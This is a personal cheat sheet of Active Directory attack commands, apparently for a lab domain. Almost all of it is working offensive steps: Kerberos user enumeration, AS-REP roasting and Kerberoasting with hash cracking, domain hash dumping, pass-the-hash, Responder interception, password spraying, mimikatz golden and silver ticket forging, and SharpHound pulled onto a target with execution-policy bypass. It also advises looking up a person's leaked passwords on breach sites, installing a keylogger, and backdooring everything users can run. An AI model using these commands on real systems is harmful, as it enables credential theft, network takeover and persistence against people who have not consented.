Before we get started:
https://attack.mitre.org/# shows a great list on how to red team, use that before using this. This is for more specific use cases.
Use https://www.breachdirectory.org/ to find passwords relating to an email, if you can't find any but the email shows up in another databreach, use the leak wiki.
Use https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp for pentesting specific ports.
Use https://www.cobalt.io/vulnerability-wiki/ while doing an active pentest for a website.
Don't be afraid to use other notes.
Lastly, don't brute force in the real world, hash cracking is fine.

Tools (install bloodhound yourself):
https://github.com/ropnop/kerbrute/releases
https://github.com/GhostPack/Rubeus
https://github.com/SecureAuthCorp/impacket/
https://github.com/ParrotSec/mimikatz
https://github.com/ropnop/kerbrute/releases
https://github.com/fox-it/BloodHound.py

Sometimes:
domain controller = CONTROLLER.local
domain controller ip = 10.10.0.131
username wordlist = User.txt
Password wordlist = Passwords.txt
hash file = hash.txt 
sorry for my sloppy notes

Enumeration:
Use: |enum4linux <ip>| for basic enumeration
Use: |nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389 -A -T4 <ip>| to find domain name (local or otherwise) 
Use: |sudo ./kerbrute userenum -d <domain> <userList>| to enum usernames
Use: |Get-NetUser | to get usernames while authenticated
Use: |Get-NetGroup | to get groups on the ad network while authenticated

Explotation:
Use: |python3 (/opt/impacket/)GetNPUsers.py <domain>/<usersname (NOTE: not one or the other, both)>| If a username dumps a hash in kerbrute
Use: |hashcat -m 18200 hash.txt passwordlist.txt --force| for cracking the above hash
Use: |smbclient -L <domain> --user <username>| if you get the password from the above command, use this to list shares
Use: |smbclient \\\\<domain>\\<share> --user <username>| to connect to a share listed from the above command
Use: |python3 secretsdump.py -just-dc <username>@<domain>| to dump hashes (this only works if you have the password) (the script should be located in /opt/impacket)
Use: |python3 psexec.py <username>:@<domain> -hashes <hash:hash (NOTE: one hash, but I put : to display the number of :)>| to exploit pass the hash attack (the script should be located in /opt/impacket)
Use: |https://github.com/lgandx/Responder| to man in the middle a bunch of hashes
Use: |hashcat -m 5600 <hash file> <password file> --force| to crack the above hashes
Note: |C:\ProgramData\ can hold domains and creds of AD|
Use: |a keylogger| if your computer is shared with a higher prived user.
Note: |backdoor everything possible that a user on the network can run|
Use: |Rubeus.exe brute /password:<passwordhere> /noticket| to spray passwords
Use: |Rubeus.exe harvest /interval:30| harvest tickets on your compromised machiene
Use: |python2 GetUserSPNs.py controller.local/<compromised machiene>:<password> -dc-ip 10.10.0.131 -request| to harvest other passwords
Use: |hashcat -m 13100 -a 0 hash.txt Pass.txt| to crack the above hashes
Use: |Rubeus.exe asreproast| to get hashes of other users (needs to be on compromised machiene)
Use: |mimkatz.exe
privilege::debug
sekurlsa::tickets /export
kerberos::ptt <ticket>| to dump and emporsinate a ticket 
Use: |lsadump::lsa /inject /name:krbtgt| This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account. (NOTE: USE AFTER SETTING UP MIMKATZ)
Use: |Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:| This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103. (NOTE: USE AFTER SETTING UP MIMKATZ)
Use: |misc::cmd| this will open a new elevated command prompt with the given ticket in mimikatz. {NOTE: USE AFTER SETTING UP MIMKATZ}
Use: |lsadump::| for help using mimkatz lsadump (helps dump creds)
Use: on the target machiene, install https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1, next run: |powershell -ep bypass
. .\Downloads\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip| upload to bloodhound
Use: |bloodhound-python -c ALL -d <domain.local> -u <username> -p <password>| in order to use bloodhound without downloading anything to the victim
Tip: |Use powerview to enum on an already compromised machiene|
Use: |Get-ADDefaultDomainPasswordPolicy| to get the password policy (useful for brute force attacks)
Use: |psexec \\test.domain -u Domain\User -p Password <command>| for lateral movement 

